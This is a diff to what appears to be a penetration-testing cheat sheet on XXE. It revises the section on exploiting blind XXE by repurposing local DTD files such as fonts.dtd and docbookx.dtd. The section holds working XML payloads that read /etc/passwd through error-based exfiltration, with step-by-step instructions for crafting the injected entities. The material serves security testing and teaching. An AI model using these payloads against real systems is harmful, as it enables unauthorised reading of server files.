@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=030defe">
+  <link rel="stylesheet" href="/assets/style.css?v=55e5dc3">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1372,7 +1372,7 @@ Content-Type: application/json
 <h1 id="advanced-techniques">Advanced Techniques</h1>
 <p>These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.</p>
 <h2 id="repurposing-local-dtds-blind-xxe">Repurposing Local DTDs (Blind XXE)</h2>
-<p>When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access. </p>
+<p>When OOB connections are blocked and the application only returns errors, we can use pre-existing DTD files on the system to build our exfiltration chain without needing network access.</p>
 <h3 id="why-enumerate-the-filesystem">Why Enumerate the Filesystem?</h3>
 <p>The goal of enumerating the filesystem is to locate <strong>default DTD files</strong> present on the system. These files can be leveraged to perform advanced XXE attacks because they often:</p>
 <ul>
@@ -1381,23 +1381,34 @@ Content-Type: application/json
 </ul>
 <h3 id="identifying-injectable-parameter-entities-in-a-dtd">Identifying Injectable Parameter Entities in a DTD</h3>
 <p>Many system DTDs are publicly available for download. When you have access to the DTD file — either because it is distributed with a known package or available in its project repository — you can analyse it offline to find which parameter entities are safe to override.</p>
-<p>The process is straightforward. Open the DTD and look for declarations of the form <code>&lt;!ENTITY % name ...&gt;</code>. These are parameter entity definitions. The ones that are useful for injection are those whose value is <strong>referenced inside other DTD declarations</strong> — specifically inside <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> declarations. When an entity is used this way, redefining it before the DTD loads lets you inject arbitrary content into the declaration that references it.</p>
-<p>To find candidates quickly, grep for <code>%name;</code> patterns (where <code>name</code> matches a defined parameter entity) inside the body of other declarations:</p>
-<pre class="highlight"><code class="language-bash">grep -n 'ENTITY %' fonts.dtd          # list all parameter entity definitions
-grep -n '%[a-z]' fonts.dtd            # list all parameter entity references</code></pre>
-<p>Cross-referencing the two outputs shows which defined entities are actually used inside declarations — those are your injection points. In <code>fonts.dtd</code> for example, <code>%expr;</code> appears inside an <code>&lt;!ELEMENT&gt;</code> declaration, which is why overriding it with a payload that breaks out of the element syntax and injects new entity declarations works.</p>
-<p>An injectable entity looks like this in the DTD:</p>
-<pre class="highlight"><code>&lt;!ELEMENT foo (%expr;)&gt;</code></pre>
-<p>A non-injectable one looks like this — the entity is used only in the document body context or not referenced at all after its definition:</p>
-<pre class="highlight"><code>&lt;!ENTITY % version "1.0"&gt;</code></pre>
-<p>The key signal is whether <code>%name;</code> appears inside a markup declaration. If it does, it is a candidate.</p>
+<p>There are two distinct types of injectable parameter entities, and they require different payload structures. Identifying which type you are dealing with is the first step before building a payload.</p>
+<h4 id="declaration-embedded-injection-points">Declaration-Embedded Injection Points</h4>
+<p>A parameter entity is a declaration-embedded injection point when it is referenced inside a markup declaration (like <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code>):</p>
+<pre class="highlight"><code class="language-xml">&lt;!ELEMENT test (%expr;)*&gt;</code></pre>
+<p>The key signal is that the parameter entity (in this case <code>%expr;</code>) appears as part of a content model or attribute list — inside the body of a markup declaration. When you override this entity, the replacement text is injected mid-declaration. You must craft the value to break out of that declaration cleanly and repair the DTD syntax that follows. </p>
+<h4 id="root-level-injection-points">Root-Level Injection Points</h4>
+<p>A parameter entity is a root-level injection point when it is referenced directly in the DTD body, outside any markup declaration:</p>
+<pre class="highlight"><code>&lt;!ENTITY % ISOamso PUBLIC "..." "isoamso.ent"&gt;
+%ISOamso;</code></pre>
+<p>The key signal is that the paraneter entity (i. this case <code>%ISOamso;</code>) appears as a standalone expansion call at the root of the DTD. When you override this entity, the replacement text is injected directly at root level — where the parser expects standalone DTD declarations. </p>
+<h4 id="identifying-candidates-with-grep">Identifying Candidates with grep</h4>
+<p>To find candidates quickly, run these two commands and cross-reference the output:</p>
+<pre class="highlight"><code class="language-bash">grep -n 'ENTITY %' target.dtd     # list all parameter entity definitions
+grep -n '%[a-zA-Z]' target.dtd    # list all parameter entity references</code></pre>
+<p>For each entity that appears in both outputs, check the context of its reference:</p>
+<ul>
+<li>If it appears inside a markup declaration like <code>&lt;!ELEMENT foo (%expr;)*&gt;</code> → <strong>declaration-embedded injection point</strong></li>
+<li>If it appears as a standalone call like <code>%ISOamso;</code> at the root of the DTD → <strong>root-level injection point</strong></li>
+</ul>
+<p>When a DTD offers both types, root-level injection points tend to produce simpler payloads, though both are equally valid paths to exploitation.</p>
+<hr />
 <h3 id="common-dtd-paths-linux">Common DTD Paths — Linux</h3>
 <pre class="highlight"><code>/usr/share/xml/fontconfig/fonts.dtd
+/usr/share/yelp/dtd/docbookx.dtd
 /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
 /usr/share/xml/xhtml/xhtml11-flat.dtd
 /usr/share/xml/svg11/svg11-flat.dtd
 /usr/share/sgml/docbook/ent/iso8879/ISOtech.ent
-/usr/share/iso8879/iso8879.ent
 /etc/xml/catalog
 /usr/local/etc/xml/catalog</code></pre>
 <h3 id="common-dtd-paths-windows">Common DTD Paths — Windows</h3>
@@ -1415,8 +1426,10 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
   %local_dtd;
 ]&gt;
 &lt;message&gt;&lt;/message&gt;</code></pre>
-<p>Error-based feedback indicates successful DTD loading. If we get a different error than "No such file or directory" or no error at all we know the file exists.</p>
+<p>Error-based feedback indicates successful DTD loading. If we get a different error than “No such file or directory” or no error at all we know the file exists.</p>
+<hr />
 <h3 id="exploitation-using-fontsdtd">Exploitation Using fonts.dtd</h3>
+<p><code>fonts.dtd</code> defines <code>%expr;</code>, which is referenced inside multiple <code>&lt;!ELEMENT&gt;</code> declarations — making it a declaration-embedded injection point. This requires structural padding to produce a syntactically valid payload.</p>
 <ul>
 <li><strong>Step 1:</strong> Load the Local DTD:</li>
 </ul>
@@ -1427,7 +1440,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 &lt;message&gt;&lt;/message&gt;</code></pre>
 <ul>
 <li><strong>Step 2:</strong> Override Parameter Entities:
-  <code>fonts.dtd</code> defines entities like <code>%expr</code> that can be overridden. We redefine them to include our malicious logic:</li>
+  <code>fonts.dtd</code> defines <code>%expr;</code> inside <code>&lt;!ELEMENT&gt;</code> declarations. We redefine it to break out of the enclosing declaration and inject our exfiltration chain. Note the <code>&lt;!ELEMENT aa (bb'&gt;</code> declaration at the end of the override — <strong>this is the structural padding</strong> that makes the payload syntactically valid when assembled with <code>fonts.dtd</code>. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in <a href="#dissecting-the-structural-padding">Dissecting the Structural Padding</a>.</li>
 </ul>
 <pre class="highlight"><code class="language-xml">&lt;!DOCTYPE message [
     &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;
@@ -1444,7 +1457,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li><code>%file</code> loads the contents of <code>/etc/passwd</code> from the local filesystem.</li>
 <li><code>%eval</code> creates a new parameter entity <code>%error</code> that references a non-existent file path concatenated with <code>%file</code> content.</li>
 <li>When the parser expands <code>%error</code>, it attempts to resolve the invalid path, triggering an error message that includes the contents of <code>/etc/passwd</code>.</li>
-<li>Note the <code>&lt;!ELEMENT aa (bb'&gt;</code> declaration at the end of the override — <strong>this is the structural padding</strong> that makes the payload syntactically valid when assembled with fonts.dtd. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in section <a href="### Dissecting the Structural Padding">Dissecting the Structural Padding</a>.</li>
+<li>The structural padding <code>&lt;!ELEMENT aa (bb'&gt;</code> absorbs the remainder of the broken <code>&lt;!ELEMENT&gt;</code> declaration in <code>fonts.dtd</code>, keeping the assembled DTD syntactically valid.</li>
 </ol>
 <ul>
 <li><strong>Step 3:</strong> Trigger Error-Based Exfiltration:
@@ -1452,15 +1465,18 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 </ul>
 <pre class="highlight"><code>errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"</code></pre>
 <h3 id="dissecting-the-structural-padding">Dissecting the Structural Padding</h3>
+<blockquote>
+<p>This subsection applies to declaration-embedded injection points only. Root-level injection points expand outside any markup declaration and do not require structural padding.</p>
+</blockquote>
 <p>The structural padding — <code>&lt;!ELEMENT aa (bb'&gt;</code> — is not an arbitrary placeholder. Its exact form is derived from the DTD being exploited, and understanding why it looks the way it does is essential for adapting this technique to other DTDs.</p>
 <h4 id="the-entity-value-and-the-role-of-the-single-quote">The Entity Value and the Role of the Single Quote</h4>
 <p>Before dissecting the assembly, one detail must be clear: the single quote in <code>&lt;!ELEMENT aa (bb'&gt;</code> is <strong>not</strong> part of the injected content. It is the closing delimiter of the entity value in the override declaration:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY % expr '...&lt;!ELEMENT aa (bb'&gt;</code></pre>
 <p>What the parser expands when it encounters <code>%expr;</code> is everything between the two <code>'</code> delimiters, without them. The actual value injected into the DTD ends with <code>(bb</code>, not <code>(bb'</code>. This distinction is critical for understanding why the assembled declarations are syntactically valid.</p>
 <h4 id="the-injection-point-in-fontsdtd">The Injection Point in fonts.dtd</h4>
-<p>When analysing <code>fonts.dtd</code>, we are looking for the <strong>first relevant use site</strong> of <code>%expr;</code> after its declaration — the first <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> body where <code>%expr;</code> is referenced, because that is where the parser will expand our override. Scanning the DTD in order, the first relevant use site is:</p>
+<p>When analysing <code>fonts.dtd</code>, we are looking for the <strong>first relevant use site</strong> of <code>%expr;</code> after its declaration — the first markup declaration body where <code>%expr;</code> is referenced, because that is where the parser will expand our override. Scanning the DTD in order, the first relevant use site is:</p>
 <pre class="highlight"><code>&lt;!ELEMENT test (%expr;)*&gt;</code></pre>
-<p>This is the declaration our override breaks open. <code>matrix</code> also references <code>%expr;</code> but appears later in the file — by the time the parser reaches it, the exfiltration logic has already executed.</p>
+<p>This is the declaration our override breaks open. The following section traces exactly how the parser assembles the payload from that point.</p>
 <h4 id="how-the-parser-assembles-the-payload">How the Parser Assembles the Payload</h4>
 <p>The literal value of <code>%expr;</code> — exactly as it appears between the entity delimiters — is:</p>
 <pre class="highlight"><code>aaa)&gt;
@@ -1491,60 +1507,62 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 &lt;!ELEMENT aa (bb)*&gt;</code></pre>
 <p>Three things happen here:</p>
 <ol>
-<li>
-<p><strong><code>&lt;!ELEMENT test (aaa)&gt;</code></strong> — the <code>(</code> that precedes <code>%expr;</code> in the original declaration plus the <code>aaa)&gt;</code> from our override produce <code>(aaa)</code> — a perfectly balanced, syntactically valid content model. The parser closes the <code>test</code> declaration and moves on.</p>
-</li>
-<li>
-<p><strong>Exfiltration logic</strong> — now sitting outside any enclosing declaration, the parser processes <code>%file</code> and <code>%eval</code> as independent DTD declarations, then drives the three-phase expansion chain that triggers the error-based exfiltration.</p>
-</li>
-<li>
-<p><strong><code>&lt;!ELEMENT aa (bb)*&gt;</code></strong> — the <code>&lt;!ELEMENT aa (bb</code> from our padding combines with the remainder of the original <code>test</code> declaration (<code>)*&gt;</code>) to form a new, syntactically valid element declaration. The <code>(</code> opened by the padding is closed by <code>)</code>, and <code>*</code> is applied as the quantifier. The parentheses are perfectly balanced. Without the padding, the parser would encounter <code>)*&gt;</code> with no opening context and reject it as malformed.</p>
-</li>
+<li><strong><code>&lt;!ELEMENT test (aaa)&gt;</code></strong> — the <code>(</code> that precedes <code>%expr;</code> in the original declaration plus the <code>aaa)&gt;</code> from our override produce <code>(aaa)</code> — a perfectly balanced, syntactically valid content model. The parser closes the <code>test</code> declaration and moves on.</li>
+<li><strong>Exfiltration logic</strong> — now sitting outside any enclosing declaration, the parser processes <code>%file</code> and <code>%eval</code> as independent DTD declarations, then drives the three-phase expansion chain that triggers the error-based exfiltration.</li>
+<li><strong><code>&lt;!ELEMENT aa (bb)*&gt;</code></strong> — the <code>&lt;!ELEMENT aa (bb</code> from our padding combines with the remainder of the original <code>test</code> declaration (<code>)*&gt;</code>) to form a new, syntactically valid element declaration. The <code>(</code> opened by the padding is closed by <code>)</code>, and <code>*</code> is applied as the quantifier. The parentheses are perfectly balanced. Without the padding, the parser would encounter <code>)*&gt;</code> with no opening context and reject it as malformed.</li>
 </ol>
-<h4 id="the-matrix-case">The matrix Case</h4>
-<p><code>matrix</code> is worth examining separately because its declaration structure produces a different and more complex assembly. Its declaration is:</p>
-<pre class="highlight"><code>&lt;!ELEMENT matrix ((%expr;), (%expr;), (%expr;), (%expr;))&gt;</code></pre>
-<p>Here <code>%expr;</code> is preceded by a double open parenthesis <code>((</code>. When our override is expanded, the assembly becomes:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ELEMENT matrix ((aaa)&gt;
-&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
-&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
-%eval;
-%error;
-&lt;!ELEMENT aa (bb, (%expr;), (%expr;), (%expr;))&gt;</code></pre>
-<p>Two differences stand out compared to the <code>test</code> case:</p>
-<ul>
-<li>
-<p><strong><code>&lt;!ELEMENT matrix ((aaa)&gt;</code></strong> has unbalanced parentheses — the outer <code>(</code> is never closed. Whether this is tolerated depends entirely on the parser. The <code>matrix</code> case is parser-dependent and should not be treated as a clean or portable assembly path.</p>
-</li>
-<li>
-<p><strong><code>&lt;!ELEMENT aa (bb, (%expr;), (%expr;), (%expr;))&gt;</code></strong> — the padding absorbs a richer remainder. The <code>, (%expr;), (%expr;), (%expr;))&gt;</code> tokens from the original declaration attach to <code>&lt;!ELEMENT aa (bb</code>, forming a valid content model. The outer <code>)</code> of the original declaration closes the <code>(</code> opened by the padding, and the parentheses balance correctly.</p>
-</li>
-</ul>
-<p>Prefer <code>test</code>-style injection points over <code>matrix</code>-style ones when building payloads for unknown or strict parser environments.</p>
 <h4 id="deriving-the-padding-for-other-dtds">Deriving the Padding for Other DTDs</h4>
-<p>The shape of the padding depends entirely on what follows the first <code>%name;</code> use site in the target declaration — the remainder that the padding must absorb. The two cases are:</p>
-<p><strong>Case 1: Minimal remainder</strong> — the declaration uses a quantifier (<code>*</code>, <code>+</code>, or <code>?</code>) directly after <code>%name;</code>, leaving only <code>)*&gt;</code>, <code>)+&gt;</code>, or <code>)?&gt;</code>  as the remainder. This is the <code>test</code> and <code>edit</code> case in <code>fonts.dtd</code>. The padding opens a content model with a placeholder:</p>
-<pre class="highlight"><code>&lt;!ELEMENT aa (bb</code></pre>
-<p>The assembled result is <code>&lt;!ELEMENT aa (bb)*&gt;</code> — a valid declaration with perfectly balanced parentheses. Prefer these injection points where possible.</p>
-<p><strong>Case 2: Rich remainder</strong> — the declaration contains additional tokens after <code>%name;</code>, such as further <code>(%expr;)</code> references, commas, or nested parentheses. This is the <code>matrix</code> case. The same padding form applies, but the broken declaration will have unbalanced parentheses. Whether this is accepted depends on the target parser. Test explicitly before relying on this path.</p>
-<p><strong>The general process</strong> for any DTD is:</p>
+<p>When targeting a declaration-embedded injection point in a different DTD, the padding must be derived from the specific declaration that contains the entity reference. The process is:</p>
 <ol>
-<li>
-<p><strong>Find the injection point.</strong> Scan the DTD in order and locate the <strong>first relevant use site</strong> of <code>%name;</code> — the first <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> body where it is referenced after its declaration. This is where the parser will expand your override and where the exfiltration logic will execute.</p>
-</li>
-<li>
-<p><strong>Identify what precedes <code>%name;</code> in that declaration.</strong> Count open parentheses and determine the minimum tokens needed to close them and terminate the declaration with <code>&gt;</code>. This is the opening of your override value.</p>
-</li>
-<li>
-<p><strong>Identify what follows <code>%name;</code> in that declaration.</strong> This is the leftover content your padding must absorb. Determine whether the remainder is minimal (Case 1) or rich (Case 2).</p>
-</li>
-<li>
-<p><strong>Construct the padding.</strong> Open a new <code>&lt;!ELEMENT name (placeholder</code> where <code>placeholder</code> is any valid XML name. Remember that the closing delimiter <code>'</code> of the entity value is not part of the injected content — the padding ends with <code>(placeholder</code>, and the remainder of the original declaration provides the closing <code>)</code>.</p>
-</li>
-<li>
-<p><strong>Verify the assembled output is valid DTD.</strong> Mentally substitute your override into the original declaration and check that every resulting <code>&lt;!ELEMENT&gt;</code> and <code>&lt;!ENTITY&gt;</code> is syntactically complete. For Case 1 injection points, parentheses should balance cleanly. For Case 2, test against the target parser explicitly.</p>
-</li>
+<li><strong>Find the injection point.</strong> Scan the DTD in order and locate the <strong>first relevant use site</strong> of the target entity — the first markup declaration body where it is referenced after its definition. This is where the parser will expand your override and where the exfiltration logic will execute.</li>
+<li><strong>Identify what precedes the entity reference in that declaration.</strong> Count open parentheses and determine the minimum tokens needed to close them and terminate the declaration with <code>&gt;</code>. This is the opening of your override value.</li>
+<li><strong>Identify what follows the entity reference in that declaration.</strong> This is the remainder your padding must absorb. Look for injection points where this remainder is minimal — ideally just a quantifier (<code>*</code>, <code>+</code>, or <code>?</code>) followed by <code>&gt;</code>, leaving only <code>)*&gt;</code>, <code>)+&gt;</code>, or <code>)?&gt;</code>  as the leftover. These produce clean, balanced assemblies.</li>
+<li><strong>Construct the padding.</strong> Open a new <code>&lt;!ELEMENT name (placeholder</code> where <code>placeholder</code> is any valid XML name. Remember that the closing delimiter <code>'</code> of the entity value is not part of the injected content — the padding ends with <code>(placeholder</code>, and the remainder of the original declaration provides the closing <code>)</code>.</li>
+<li><strong>Verify the assembled output is valid DTD.</strong> Mentally substitute your override into the original declaration and check that every resulting <code>&lt;!ELEMENT&gt;</code> and <code>&lt;!ENTITY&gt;</code> is syntactically complete. Parentheses should balance cleanly. If they do not, choose a different injection point.</li>
 </ol>
+<hr />
+<h3 id="exploitation-using-docbookxdtd">Exploitation Using docbookx.dtd</h3>
+<p>Both techniques exploit the same fundamental mechanism — overriding a parameter entity to inject the exfiltration chain into an external DTD context where parameter entity chaining is permitted. The difference is purely structural: with a root-level injection point the overridden entity expands outside any markup declaration, so no declaration needs breaking open and no padding is required.</p>
+<p><code>docbookx.dtd</code> defines a set of ISO character entity sets as parameter entities that are expanded directly at root level:</p>
+<pre class="highlight"><code>&lt;!ENTITY % ISOamso PUBLIC "..." "isoamso.ent"&gt;
+%ISOamso;</code></pre>
+<p><code>%ISOamso;</code> is a root-level injection point. Overriding it injects the exfiltration logic directly into the DTD body as standalone declarations.</p>
+<ul>
+<li><strong>Step 1:</strong> Load the Local DTD:</li>
+</ul>
+<pre class="highlight"><code class="language-xml">&lt;!DOCTYPE message [
+  &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+  %local_dtd;
+]&gt;
+&lt;message&gt;&lt;/message&gt;</code></pre>
+<ul>
+<li><strong>Step 2:</strong> Override the Root-Level Entity:
+  We redefine <code>%ISOamso;</code> with the exfiltration chain directly. No structural padding is needed — the replacement text is injected at root level where standalone DTD declarations are valid.</li>
+</ul>
+<p>Note that the entity value <strong>must</strong> be delimited by single quotes. The exfiltration declarations inside the value use double quotes (<code>SYSTEM "..."</code>) — using double quotes as the outer delimiter would cause the parser to close the entity value at the first <code>"</code> it encounters inside the payload. The single quote <code>'</code> that ends the payload closes the entity value opened at the start of the <code>%ISOamso</code> declaration.</p>
+<pre class="highlight"><code class="language-xml">&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+    &lt;!ENTITY % ISOamso '
+        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
+        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+    '&gt;
+    %local_dtd;
+]&gt;
+&lt;message&gt;&lt;/message&gt;</code></pre>
+<p><strong>Explanation:</strong></p>
+<ol>
+<li><code>%ISOamso;</code> is normally expanded at root level in <code>docbookx.dtd</code> to load a character entity set. We redefine it to inject the exfiltration chain instead.</li>
+<li>Because the injection happens at root level, the three-phase chain — <code>%file</code>, <code>%eval</code>, <code>%error</code> — lands directly in the DTD body as independent declarations. No declaration needs breaking open and no remainder needs absorbing.</li>
+<li><code>%eval;</code> produces the declaration of <code>%error</code>, and <code>%error;</code> triggers the URI resolution error that leaks the file contents — identical to the <code>fonts.dtd</code> case.</li>
+</ol>
+<ul>
+<li><strong>Step 3:</strong> Trigger Error-Based Exfiltration:
+  If the application returns error messages, the response will include something like:</li>
+</ul>
+<pre class="highlight"><code>errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"</code></pre>
+<hr />
 <h3 id="requirements-for-robust-payloads">Requirements for Robust Payloads</h3>
 <p>Creating a working payload for local DTD-based XXE exploitation requires careful attention to XML and DTD parsing rules. Below are the key requirements:</p>
 <ol>
@@ -1553,9 +1571,9 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <ul>
 <li>The injected payload must maintain a syntactically valid DTD.</li>
 <li>All markup declarations (<code>&lt;!ELEMENT&gt;</code>, <code>&lt;!ENTITY&gt;</code>) must appear in a proper order.</li>
-<li>If the included DTD (<code>%local_dtd;</code>) contains markup declarations, use a <strong>dummy element</strong> (e.g., <code>&lt;!ELEMENT aa (bb'&gt;</code>) to absorb conflicts and prevent parser errors.</li>
+<li>For declaration-embedded injection points, use structural padding (e.g., <code>&lt;!ELEMENT aa (bb'&gt;</code>) to absorb the remainder of the broken declaration and prevent parser errors. Root-level injection points do not require padding.</li>
 </ul>
-<ol start="2">
+<ol>
 <li><strong>Correct Entity Nesting and Escaping</strong></li>
 </ol>
 <ul>
@@ -1563,37 +1581,42 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li>Use <code>&amp;#x25;</code> for <code>%</code>, <code>&amp;#x26;</code> for <code>&amp;</code> and <code>&amp;#x27;</code> for quotes.</li>
 <li>
 <p><strong>Example</strong>:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///path/%file;'&gt;"&gt;</code></pre>
-</li>
-<li>
-<p>Failure to escape these characters often results in <strong>markup declaration errors</strong>.</p>
+<p><pre class="highlight"><code class="language-xml">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///path/%file;'&gt;"&gt;</code></pre>
+  - Failure to escape these characters often results in <strong>markup declaration errors</strong>.</p>
 </li>
 </ul>
-<ol start="3">
+<ol>
 <li><strong>Order of Expansion</strong></li>
 </ol>
 <ul>
 <li>Override entities must be declared before <code>%local_dtd;</code> is expanded — the internal subset is processed first, so any overrides must be in place before the external DTD is loaded.</li>
-<li>Once <code>%local_dtd;</code> is expanded, the parser reaches the first relevant use site of <code>%expr;</code> and injects the exfiltration chain into the DTD. Within that injected text, <code>%eval;</code> is expanded inline — its expansion produces the declaration of <code>%error</code>. Immediately after, <code>%error;</code> is expanded, triggering the URI resolution that leaks the file contents.</li>
+<li>Once <code>%local_dtd;</code> is expanded, the parser reaches the first relevant use site of the overridden entity and injects the exfiltration chain into the DTD. Within that injected text, <code>%eval;</code> is expanded inline — its expansion produces the declaration of <code>%error</code>. Immediately after, <code>%error;</code> is expanded, triggering the URI resolution that leaks the file contents.</li>
 <li>The entire chain executes automatically as part of <code>%local_dtd;</code> processing. Explicitly expanding <code>%eval;</code> or <code>%error;</code> in the internal subset is neither possible nor necessary — and attempting to do so would cause the parser to reject the payload due to the parameter entity chaining restriction in the internal subset.</li>
 </ul>
-<ol start="4">
-<li><strong>Include a Structural Padding</strong></li>
+<ol>
+<li><strong>Include Structural Padding for Declaration-Embedded Injection Points</strong></li>
 </ol>
 <ul>
-<li>When including external DTDs, add a placeholder declaration like:</li>
+<li>When the overridden entity is referenced inside a markup declaration (like <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code>), add a padding declaration to absorb the remainder of the broken declaration:</li>
 </ul>
 <pre class="highlight"><code class="language-xml">  &lt;!ELEMENT aa (bb'&gt;</code></pre>
 <ul>
-<li>This prevents syntax conflicts when the external DTD introduces new declarations.</li>
+<li>The exact form of the padding depends on the target DTD. Refer to <a href="#dissecting-the-structural-padding">Dissecting the Structural Padding</a> for the derivation process.</li>
+<li>Root-level injection points do not require padding.</li>
 </ul>
-<ol start="5">
+<ol>
+<li><strong>Use Single Quotes as Entity Value Delimiters</strong></li>
+</ol>
+<ul>
+<li>The exfiltration declarations inside the entity value use double quotes (<code>SYSTEM "..."</code>). The outer entity value delimiter must therefore be single quotes to avoid the parser closing the entity value prematurely at the first <code>"</code> it encounters. This applies to both injection types.</li>
+</ul>
+<ol>
 <li><strong>Use Parameter Entities for Injection</strong></li>
 </ol>
 <ul>
 <li>Always use <strong>parameter entities</strong> (<code>%</code>) for overriding and chaining.</li>
 </ul>
-<ol start="6">
+<ol>
 <li><strong>Error-Based Exfiltration Logic</strong></li>
 </ol>
 <ul>
@@ -1601,17 +1624,18 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li>Example:</li>
 </ul>
 <pre class="highlight"><code class="language-xml">    &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;</code></pre>
-<ol start="7">
+<ol>
 <li><strong>Compatibility with Target DTD</strong></li>
 </ol>
 <ul>
 <li>The chosen local DTD must allow parameter entity overrides.</li>
-<li>Common candidates: <code>fonts.dtd</code>, <code>docbook.dtd</code>, <code>jspxml.dtd</code></li>
+<li>Common candidates with declaration-embedded injection points: <code>fonts.dtd</code> (<code>%expr;</code>), <code>jspxml.dtd</code> (<code>%Body;</code>)</li>
+<li>Common candidates with root-level injection points: <code>docbookx.dtd</code> (<code>%ISOamso;</code> and other ISO entity sets)</li>
 </ul>
 <h3 id="why-this-technique-works">Why This Technique Works</h3>
 <p>The W3C XML specification forbids parameter entity chaining within the internal DTD subset — this is the restriction that makes the basic error-based payload unreliable in spec-compliant parsers, as explained in the <a href="#error-based-blind-xxe">Error-Based Blind XXE</a> section.</p>
 <p>This technique sidesteps that restriction entirely. Rather than chaining parameter entities inside the internal subset, we use the internal subset only to <strong>redefine</strong> an entity that already exists in the local DTD. Because entity declarations follow a first-definition-wins rule, our override takes effect before the original declaration in the DTD is reached.</p>
-<p>When <code>%local_dtd;</code> is then expanded, execution moves into the external DTD context — where parameter entity chaining is explicitly permitted by the spec. The malicious logic embedded inside <code>%expr</code> executes there, not in the internal subset, which is why spec-compliant parsers do not reject it.</p>
+<p>When <code>%local_dtd;</code> is then expanded, execution moves into the external DTD context — where parameter entity chaining is explicitly permitted by the spec. The malicious logic embedded inside the overridden entity executes there, not in the internal subset, which is why spec-compliant parsers do not reject it. This holds true for both injection types — the type determines the payload structure, not the underlying mechanism.</p>
 <h2 id="dns-based-oob-exfiltration">DNS-Based OOB Exfiltration</h2>
 <p>When HTTP/HTTPS connections are blocked by firewall rules, DNS exfiltration provides an alternative. DNS traffic is rarely fully blocked so even if the HTTP request never reaches us, the DNS query still happens when the parser tries to resolve the domain:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
@@ -1945,6 +1969,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=030defe" defer></script>
+  <script src="/assets/main.js?v=55e5dc3" defer></script>
 </body>
 </html>
